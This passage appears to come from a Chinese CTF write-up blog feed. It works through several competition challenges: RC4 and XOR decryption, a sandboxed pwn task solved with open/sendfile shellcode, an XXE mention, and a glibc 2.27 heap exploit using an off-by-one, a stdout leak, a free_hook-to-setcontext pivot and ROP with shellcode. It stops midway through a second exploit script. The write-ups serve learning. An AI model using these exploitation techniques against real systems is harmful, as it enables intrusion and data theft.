class="line">    &#123;</span><br><span class="line">        v6 = ((*(_BYTE*)(j % a3 + a2) ^ <span class="number">0x37</span>) + *(<span class="type">unsigned</span> __int8*)(a1 + j) + v6) % <span class="number">256</span>;</span><br><span class="line">        v4 = *(_BYTE*)(a1 + j);</span><br><span class="line">        *(_BYTE*)(a1 + j) = *(_BYTE*)(a1 + v6);</span><br><span class="line">        </span><br><span class="line">        *(_BYTE*)(a1 + v6) = v4;</span><br><span class="line">        <span class="comment">//printf(&quot;%d,&quot;,*(_BYTE*)(a1 + j));</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    *(_DWORD*)(a1 + <span class="number">260</span>) = <span class="number">0</span>;</span><br><span class="line">    result = a1;</span><br><span class="line">    *(_DWORD*)(a1 + <span class="number">256</span>) = *(_DWORD*)(a1 + <span class="number">260</span>);</span><br><span class="line">    <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">__int64 __fastcall <span class="title function_">rc4_next</span><span class="params">(__int64 a1)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">unsigned</span> __int8 v2; <span class="comment">// [rsp+Eh] [rbp-2h]</span></span><br><span class="line">    <span class="type">char</span> v3; <span class="comment">// [rsp+Fh] [rbp-1h]</span></span><br><span class="line"></span><br><span class="line">    *(_DWORD*)(a1 + <span class="number">256</span>) = (*(_DWORD*)(a1 + <span class="number">256</span>) + <span class="number">1</span>) % <span class="number">256</span>;</span><br><span class="line">    *(_DWORD*)(a1 + <span class="number">260</span>) = (*(_DWORD*)(a1 + <span class="number">260</span>) + *(<span class="type">unsigned</span> __int8*)(a1 + *(<span class="type">int</span>*)(a1 + <span class="number">256</span>))) % <span class="number">256</span>;</span><br><span class="line">    v3 = *(_BYTE*)(a1 + *(<span class="type">int</span>*)(a1 + <span class="number">256</span>));</span><br><span class="line">    *(_BYTE*)(a1 + *(<span class="type">int</span>*)(a1 + <span class="number">256</span>)) = *(_BYTE*)(a1 + *(<span class="type">int</span>*)(a1 + <span class="number">260</span>));</span><br><span class="line">    *(_BYTE*)(a1 + *(<span class="type">int</span>*)(a1 + <span class="number">260</span>)) = v3;</span><br><span class="line">    v2 = *(_BYTE*)(a1 + (<span class="type">unsigned</span> __int8)(*(_BYTE*)(a1 + *(<span class="type">int</span>*)(a1 + <span class="number">256</span>)) + *(_BYTE*)(a1 + *(<span class="type">int</span>*)(a1 + <span class="number">260</span>))));</span><br><span class="line">    <span class="keyword">return</span> (<span class="number">16</span> * v2) | (<span class="type">unsigned</span> <span class="type">int</span>)(v2 &gt;&gt; <span class="number">4</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">unsigned</span> <span class="type">char</span> key[<span class="number">0x200</span>];</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">char</span> real_key[] = <span class="string">&quot;EC3700DFCD4F364EC54B19C5E7E26DEF6A25087C4FCDF4F8507A40A9019E3B48BD70129D0141A5B8F089F280F4BE6CCD&quot;</span>;</span><br><span class="line">    rc4_init((<span class="type">long</span> <span class="type">long</span>)key, (<span class="type">long</span> <span class="type">long</span>)real_key, <span class="keyword">sizeof</span>(real_key)<span class="number">-1</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">42</span>; i++) &#123;</span><br><span class="line">        data[i] ^= rc4_next((<span class="type">long</span> <span class="type">long</span>)key);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%s&quot;</span>, data);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>flag{8263b6c6-094d-4bd8-bbc2-b63ab34e8db7}</p><h3 id="æƒ…æŠ¥æ”¶é›†">æƒ…æŠ¥æ”¶é›†</h3><h4 id="é»‘å®¢å¯†å®¤é€ƒè„±">é»‘å®¢å¯†å®¤é€ƒè„±</h4><p>æ–‡ä»¶è¯»å–ï¼Œè®¿é—®/file?name=/app/app.pyå¯ä»¥å¾—åˆ°æºç ï¼Œå®¡è®¡ä»£ç </p><p>è®¿é—®/file?name=hidden.txt,å¾—åˆ°å¯†é’¥</p><p><img src="https://s2.loli.net/2025/04/26/V64CfOy5RYnFgtG.png" alt="image-20250426114137286"></p><p>è®¿é—®/logsï¼Œå¾—åˆ°å¯†æ–‡</p><p><img src="https://s2.loli.net/2025/04/26/V64CfOy5RYnFgtG.png" alt=""></p><p>å¾—åˆ°flag</p><p>exp</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">def decrypt_data(encrypted_hex, key):</span><br><span class="line">    # Convert hex string <span class="keyword">to</span> bytes</span><br><span class="line">    <span class="keyword">encrypted</span> = bytes.fromhex(encrypted_hex)</span><br><span class="line">    decrypted = bytearray()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> <span class="keyword">index</span> <span class="keyword">in</span> range(len(<span class="keyword">encrypted</span>)):</span><br><span class="line">        <span class="type">char</span> = <span class="keyword">encrypted</span>[<span class="keyword">index</span>]</span><br><span class="line">        key_char = key[<span class="keyword">index</span> % len(key)]</span><br><span class="line">        # <span class="keyword">Perform</span> decryption <span class="keyword">by</span> subtracting the key <span class="type">character</span></span><br><span class="line">        decrypted.append(<span class="type">char</span> - ord(key_char))</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> decrypted.decode()</span><br><span class="line"></span><br><span class="line"># <span class="keyword">Encrypted</span> data <span class="keyword">and</span> key</span><br><span class="line">encrypted_hex = <span class="string">&#x27;d9d1c4d9e0d795a49ab19a976366a8c794d692a8929ecba69a6a6872a09a94a397acc29f99df6a9468b6&#x27;</span></span><br><span class="line">key = &quot;secret_key8129&quot;</span><br><span class="line"></span><br><span class="line"># Decrypt <span class="keyword">and</span> print the result</span><br><span class="line">print(decrypt_data(encrypted_hex, key))</span><br></pre></td></tr></table></figure><p><img src="https://s2.loli.net/2025/04/26/4g93Z7DVOzmpYNJ.png" alt="image-20250426114238954"></p><p>flag{c6958bf1-5b1d-433f-b969-51128c44f2c6}</p><h3 id="æ¼æ´æŒ–æ˜åˆ†æ">æ¼æ´æŒ–æ˜åˆ†æ</h3><h4 id="RuneBreach">RuneBreach</h4><p>ç¨‹åºå°±æ˜¯å†™äº†ä¸€ä¸ªæ‰“æ€ªé€»è¾‘ï¼Œå½“n100&lt;0çš„æ—¶å€™ï¼Œä¼šç»™ä¸€æ¬¡æ‰§è¡Œshellcodeçš„æœºä¼šï¼Œæˆ–è€…è¾“å…¥åˆ«çš„åç»­æœ‰ä¸ªæ ˆæº¢å‡º</p><p><img src="https://s2.loli.net/2025/04/26/tI3vJKVNpsxuzE4.png" alt="image-20250426114842604"></p><p><img src="https://s2.loli.net/2025/04/26/63aAvlCUMQqcrFH.png" alt="image-20250426115005757"></p><p>ä½†è¿™ä¸ªé¢˜ç›®å¼€å¯äº†æ²™ç›’ï¼Œæ˜æ˜¾è¯»å…¥orwçš„shellcodeæ›´å¿«<img src="https://s2.loli.net/2025/04/26/vTm6pubnGIoMFea.png" alt="image-20250426115043418"></p><p>éšä¾¿è¾“å…¥å­—ç¬¦ä¸²è¿›å…¥BOSSç¯èŠ‚ï¼Œè¾“å…¥orwçš„shellcodeï¼Œå¾—åˆ°flag</p><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line">from pwn import*</span><br><span class="line"></span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>,arch=<span class="string">&#x27;amd64&#x27;</span>,log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">elf=ELF(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">p=remote(<span class="string">&#x27;8.147.132.32&#x27;</span>,<span class="number">18505</span>)</span><br><span class="line">#p=process(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">p<span class="number">.</span>recvuntil(<span class="string">&quot;\nDefend? (y/N): &quot;</span>)</span><br><span class="line">p<span class="number">.</span>sendline(b<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p<span class="number">.</span>recvuntil(<span class="string">&quot;\nDefend? (y/N): &quot;</span>)</span><br><span class="line">p<span class="number">.</span>sendline(b<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p<span class="number">.</span>recvuntil(<span class="string">&quot;\nDefend? (y/N): &quot;</span>)</span><br><span class="line">p<span class="number">.</span>sendline(b<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p<span class="number">.</span>recvuntil(<span class="string">&quot;\nDefend? (y/N): &quot;</span>)</span><br><span class="line">p<span class="number">.</span>sendline(b<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p<span class="number">.</span>recvuntil(<span class="string">&quot;[BOSS] Say your last word to your territory: &quot;</span>)</span><br><span class="line">payload=asm(<span class="string">&#x27;&#x27;&#x27;</span>    </span><br><span class="line">    <span class="keyword">mov</span> <span class="built_in">rax</span>, <span class="number">0x67616c662f2e</span></span><br><span class="line">    <span class="keyword">push</span> <span class="built_in">rax</span></span><br><span class="line">    <span class="keyword">xor</span> <span class="built_in">rdi</span>, <span class="built_in">rdi</span></span><br><span class="line">    <span class="keyword">sub</span> <span class="built_in">rdi</span>, <span class="number">100</span></span><br><span class="line">    <span class="keyword">mov</span> <span class="built_in">rsi</span>, <span class="built_in">rsp</span></span><br><span class="line">    <span class="keyword">xor</span> <span class="built_in">edx</span>, <span class="built_in">edx</span></span><br><span class="line">    <span class="keyword">xor</span> <span class="built_in">r10</span>, <span class="built_in">r10</span></span><br><span class="line">    <span class="keyword">push</span> SYS_openat</span><br><span class="line">    <span class="keyword">pop</span> <span class="built_in">rax</span></span><br><span class="line">    <span class="keyword">syscall</span></span><br><span class="line"></span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">    <span class="keyword">mov</span> <span class="built_in">rdi</span>, <span class="number">1</span></span><br><span class="line">    <span class="keyword">mov</span> <span class="built_in">rsi</span>, <span class="number">3</span></span><br><span class="line">    <span class="keyword">push</span> <span class="number">0</span></span><br><span class="line">    <span class="keyword">mov</span> <span class="built_in">rdx</span>, <span class="built_in">rsp</span></span><br><span class="line">    <span class="keyword">mov</span> <span class="built_in">r10</span>, <span class="number">0x100</span></span><br><span class="line">    <span class="keyword">push</span> SYS_sendfile</span><br><span class="line">    <span class="keyword">pop</span> <span class="built_in">rax</span></span><br><span class="line">    <span class="keyword">syscall</span></span><br><span class="line">    <span class="string">&#x27;&#x27;&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p<span class="number">.</span>sendline(payload)</span><br><span class="line"></span><br><span class="line">p<span class="number">.</span>interactive()</span><br></pre></td></tr></table></figure><p>flag{33dc7e62-e555-40b6-8f72-1b24d6e6cb44}</p><p><img src="https://s2.loli.net/2025/04/26/yHMfXh6eaiRWgY4.png" alt="image-20250426125621468"></p><h4 id="æ˜Ÿé™…XMLè§£æå™¨">æ˜Ÿé™…XMLè§£æå™¨</h4><p>xxeæ”»å‡»ï¼Œç›´æ¥ä¼ ä¸ªpayloadå°±è¡Œäº†</p><p><img src="https://s2.loli.net/2025/04/26/zLgsvR8aOKUeyqQ.png" alt="image-20250426115525208"></p><p><img src="https://s2.loli.net/2025/04/26/9SrFnlZ2HzRVWQt.png" alt="image-20250426115508494"></p><p>flag{7826b63b-5646-4920-8f01-b26b1806a979}</p>]]></content>
    
    
    <summary type="html">2025è“æ¡¥æ¯</summary>
    
    
    
    <category term="Writeup" scheme="https://www.thir0th.xyz/categories/Writeup/"/>
    
    
    <category term="CTF" scheme="https://www.thir0th.xyz/tags/CTF/"/>
    
  </entry>
  
  <entry>
    <title>2024æ¥šæ…§æ¯</title>
    <link href="https://www.thir0th.xyz/posts/cb11c07b.html"/>
    <id>https://www.thir0th.xyz/posts/cb11c07b.html</id>
    <published>2025-04-20T06:40:35.000Z</published>
    <updated>2025-04-20T06:42:37.910Z</updated>
    
    <content type="html"><![CDATA[<span id="more"></span><h1>2024æ¥šæ…§æ¯</h1><h3 id="EZheap-2">EZheap_2</h3><p>2.27å †é¢˜<br>add,free,editä¸‰ä¸ªåŠŸèƒ½</p><p>of by oneæ¼æ´ï¼Œæœ‰æ²™ç›’</p><p>å‡½æ•°ä¸€ä¸ªgiftç»™å‡ºpieåœ°å€</p><p>æˆ‘ä»¬å¯ä»¥æ”»å‡»stdout_attackæ³„éœ²libc</p><p>åç»­æ”»å‡»free_hookä¸ºsetcontect+53ï¼Œæ„é€ å‡ºreadè¯»å…¥shellcode</p><p>æˆ–è€…æ³„éœ²environåŠ«æŒrbp+8<br><img src="https://cdn.nlark.com/yuque/0/2024/png/43448046/1734955053742-cd9ac187-b081-4572-984c-fd2d05b88dd4.png" alt=""></p><p>shellcode</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br></pre></td><td class="code"><pre><span class="line">from pwn import*</span><br><span class="line">from struct import pack</span><br><span class="line">import ctypes</span><br><span class="line">#from LibcSearcher import *</span><br><span class="line">from ae64 import AE64</span><br><span class="line">def bug():</span><br><span class="line">gdb.attach(p)</span><br><span class="line">pause()</span><br><span class="line">def s(a):</span><br><span class="line">p.send(a)</span><br><span class="line">def sa(a,b):</span><br><span class="line">p.sendafter(a,b)</span><br><span class="line">def sl(a):</span><br><span class="line">p.sendline(a)</span><br><span class="line">def sla(a,b):</span><br><span class="line">p.sendlineafter(a,b)</span><br><span class="line">def r(a):</span><br><span class="line">p.recv(a)</span><br><span class="line">#def pr(a):</span><br><span class="line">#print(p.recv(a))</span><br><span class="line">def rl(a):</span><br><span class="line">return p.recvuntil(a)</span><br><span class="line">def inter():</span><br><span class="line">p.interactive()</span><br><span class="line">def get_addr64():</span><br><span class="line">return u64(p.recvuntil(&quot;\x7f&quot;)[-6:].ljust(8,b&#x27;\x00&#x27;))</span><br><span class="line">def get_addr32():</span><br><span class="line">return u32(p.recvuntil(&quot;\xf7&quot;)[-4:])</span><br><span class="line">def get_sb():</span><br><span class="line">return libc_base+libc.sym[&#x27;system&#x27;],libc_base+libc.search(b&quot;/bin/sh\x00&quot;).__next__()</span><br><span class="line">def get_hook():</span><br><span class="line">return libc_base+libc.sym[&#x27;__malloc_hook&#x27;],libc_base+libc.sym[&#x27;__free_hook&#x27;]</span><br><span class="line">li = lambda x : print(&#x27;\x1b[01;38;5;214m&#x27; + x + &#x27;\x1b[0m&#x27;)</span><br><span class="line">ll = lambda x : print(&#x27;\x1b[01;38;5;1m&#x27; + x + &#x27;\x1b[0m&#x27;)</span><br><span class="line"></span><br><span class="line">    </span><br><span class="line">#context(os=&#x27;linux&#x27;,arch=&#x27;i386&#x27;,log_level=&#x27;debug&#x27;)   </span><br><span class="line">context(os=&#x27;linux&#x27;,arch=&#x27;amd64&#x27;,log_level=&#x27;debug&#x27;)</span><br><span class="line">libc=ELF(&#x27;./libc.so.6&#x27;)   </span><br><span class="line">#libc=ELF(&#x27;/root/glibc-all-in-one/libs/2.35-0ubuntu3.8_amd64/libc.so.6&#x27;) </span><br><span class="line">#libc=ELF(&#x27;/lib/i386-linux-gnu/libc.so.6&#x27;)</span><br><span class="line">#libc=ELF(&#x27;libc-2.23.so&#x27;) </span><br><span class="line">#libc=ELF(&#x27;/root/glibc-all-in-one/libs/2.23-0ubuntu11.3_amd64/libc.so.6&#x27;)    </span><br><span class="line">#libc=ELF(&quot;/lib/x86_64-linux-gnu/libc.so.6&quot;)</span><br><span class="line">elf=ELF(&#x27;./pwn&#x27;)</span><br><span class="line">#p=remote(&#x27;139.155.126.78&#x27;,16215)</span><br><span class="line">p = process(&#x27;./pwn&#x27;)</span><br><span class="line"></span><br><span class="line">def add(i,size):</span><br><span class="line">rl(&quot;Your choice:&quot;)</span><br><span class="line">sl(str(1))</span><br><span class="line">rl(&quot;index:&quot;)</span><br><span class="line">sl(str(i))</span><br><span class="line">rl(&quot;Size:&quot;)</span><br><span class="line">sl(str(size))</span><br><span class="line">def edit(i,content):</span><br><span class="line">rl(&quot;Your choice:&quot;)</span><br><span class="line">sl(str(2))</span><br><span class="line">rl(&quot;index:&quot;)</span><br><span class="line">sl(str(i))</span><br><span class="line">rl(&quot;context: &quot;)</span><br><span class="line">s(content)</span><br><span class="line">def free(i):</span><br><span class="line">rl(&quot;Your choice:&quot;)</span><br><span class="line">sl(str(3))</span><br><span class="line">rl(&quot;index:&quot;)</span><br><span class="line">sl(str(i))</span><br><span class="line">def gift():</span><br><span class="line">rl(&quot;Your choice:&quot;)</span><br><span class="line">sl(str(4))</span><br><span class="line">rl(&quot;choose:&quot;)</span><br><span class="line">sl(str(2))</span><br><span class="line"></span><br><span class="line">add(0,0x18)  #0</span><br><span class="line">add(1,0x68)  #1</span><br><span class="line">add(2,0x68)  #2</span><br><span class="line">add(3,0x18)  #3</span><br><span class="line">edit(0,b&#x27;\x00&#x27;*0x18+p8(0xe1))</span><br><span class="line">free(1)</span><br><span class="line">add(4,0xd8)  </span><br><span class="line">gift()</span><br><span class="line">rl(b&#x27;0x&#x27;)</span><br><span class="line">pie_base=int(p.recv(12),16)-0x202160</span><br><span class="line">li(hex(pie_base))</span><br><span class="line">free(2)</span><br><span class="line">edit(4,b&#x27;\x00&#x27;*0x68+p64(0x71)+p64(pie_base+0x202020)) </span><br><span class="line">add(5,0x68)</span><br><span class="line">add(6,0x68)</span><br><span class="line">add(7,0x68)</span><br><span class="line">edit(7,p64(0xfbad1800) + p64(0)*3 + b&#x27;\x00&#x27;)</span><br><span class="line">libc_base=get_addr64()-0x3ed8b0</span><br><span class="line">li(hex(libc_base))</span><br><span class="line">system,bin_sh=get_sb()</span><br><span class="line">malloc_hook,free_hook=get_hook()</span><br><span class="line">rdi = libc_base+libc.search(asm(&quot;pop rdi\nret&quot;)).__next__()</span><br><span class="line">rsi = libc_base+libc.search(asm(&quot;pop rsi\nret&quot;)).__next__()</span><br><span class="line">rdx = libc_base+libc.search(asm(&quot;pop rdx\nret&quot;)).__next__()</span><br><span class="line">rax = libc_base+libc.search(asm(&quot;pop rax\nret&quot;)).__next__()</span><br><span class="line">ret = libc_base+libc.search(asm(&quot;ret&quot;)).__next__()</span><br><span class="line">syscall=libc_base+libc.search(asm(&quot;syscall\nret&quot;)).__next__()</span><br><span class="line">jmp_rsp=libc_base+libc.search(asm(&quot;jmp rsp&quot;)).__next__()</span><br><span class="line">free_hook=libc_base+libc.sym[&#x27;__free_hook&#x27;]</span><br><span class="line">setcontext=libc_base+libc.sym[&#x27;setcontext&#x27;]</span><br><span class="line">open_addr=libc_base+libc.sym[&#x27;open&#x27;]</span><br><span class="line">read_addr=libc_base + libc.sym[&#x27;read&#x27;]</span><br><span class="line">write_addr=libc_base + libc.sym[&#x27;write&#x27;]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">add(8,0x18)</span><br><span class="line">add(9,0x58)</span><br><span class="line">add(10,0x58)</span><br><span class="line">add(11,0x18)</span><br><span class="line"></span><br><span class="line">edit(8,b&#x27;\x00&#x27;*0x18+p8(0xc1))</span><br><span class="line"></span><br><span class="line">free(9)</span><br><span class="line">add(12,0xb8)</span><br><span class="line">free(10)</span><br><span class="line">edit(12,b&#x27;\x00&#x27;*0x58+p64(0x61)+p64(free_hook))</span><br><span class="line">payload=(b&#x27;\x00&#x27;*0x68+p64(0)+p64(free_hook&amp;0xfffffffffffff000)+p64(0)*2+p64(0x2000)).ljust(0xa0,b&#x27;\x00&#x27;)+p64(free_hook&amp;0xfffffffffffff000)+p64(syscall)</span><br><span class="line">add(13,0x58)</span><br><span class="line">add(14,0x58)</span><br><span class="line">edit(14,p64(setcontext+53))</span><br><span class="line">add(15,0x400)</span><br><span class="line">edit(15,payload)</span><br><span class="line">#bug()</span><br><span class="line">free(15)</span><br><span class="line">pause()</span><br><span class="line">sleep(0.1)</span><br><span class="line">payload  = p64(rdi)+p64(free_hook&amp;0xfffffffffffff000)</span><br><span class="line">payload += p64(rsi)+p64(0x1000)</span><br><span class="line">payload += p64(rdx)+p64(7)</span><br><span class="line">payload += p64(rax)+p64(10)</span><br><span class="line">payload += p64(syscall) #mprotect(free_hook&amp;0xfffffffffffff000,0x1000,7)</span><br><span class="line">payload += p64(jmp_rsp)</span><br><span class="line">payload += asm(shellcraft.open(&#x27;/flag&#x27;))</span><br><span class="line">payload += asm(shellcraft.read(3,free_hook+0x300,0x30))</span><br><span class="line">payload += asm(shellcraft.write(1,free_hook+0x300,0x30))</span><br><span class="line"></span><br><span class="line">sl(payload)</span><br><span class="line"></span><br><span class="line">inter()</span><br></pre></td></tr></table></figure><p>environ</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br></pre></td><td class="code"><pre><span class="line">from pwn import*</span><br><span class="line">from struct import pack</span><br><span class="line">import ctypes</span><br><span class="line">#from LibcSearcher import *</span><br><span class="line">from ae64 import AE64</span><br><span class="line">def bug():</span><br><span class="line">gdb.attach(p)</span><br><span class="line">pause()</span><br><span class="line">def s(a):</span><br><span class="line">p.send(a)</span><br><span class="line">def sa(a,b):</span><br><span class="line">p.sendafter(a,b)</span><br><span class="line">def sl(a):</span><br><span class="line">p.sendline(a)</span><br><span class="line">def sla(a,b):</span><br><span class="line">p.sendlineafter(a,b)</span><br><span class="line">def r(a):</span><br><span class="line">p.recv(a)</span><br><span class="line">#def pr(a):</span><br><span class="line">#print(p.recv(a))</span><br><span class="line">def rl(a):</span><br><span class="line">return p.recvuntil(a)</span><br><span class="line">def inter():</span><br><span class="line">p.interactive()</span><br><span class="line">def get_addr64():</span><br><span class="line">return u64(p.recvuntil(&quot;\x7f&quot;)[-6:].ljust(8,b&#x27;\x00&#x27;))</span><br><span class="line">def get_addr32():</span><br><span 